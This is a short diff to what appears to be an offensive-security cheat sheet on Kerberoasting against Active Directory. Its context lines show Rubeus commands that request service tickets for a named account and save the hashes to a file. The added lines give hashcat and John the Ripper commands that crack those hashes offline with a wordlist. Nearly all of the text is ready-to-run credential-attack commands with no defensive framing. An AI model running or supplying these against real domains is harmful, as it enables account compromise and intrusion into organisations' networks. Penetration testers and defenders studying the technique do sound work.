@@ -300,7 +300,15 @@ Rubeus.exe kerberoast /stats
 Rubeus.exe kerberoast /user:analystm2 /nowrap
 Rubeus.exe kerberoast /user:analystm2 /nowrap /simple
 Rubeus.exe kerberoast /user:analystm2 /nowrap /simple /outfile:C:\hashestgt.txt
-
+```
+##### KERBEROASTING - CRACK PASSWORD
+```
+hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt
+hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt -o quebradas.txt
+```
+```
+john hashestgt.txt --wordlist=wordlist.txt
+john --show hashestgt.txt
 ```
 # POWERSHELL
 ## DOWNLOAD
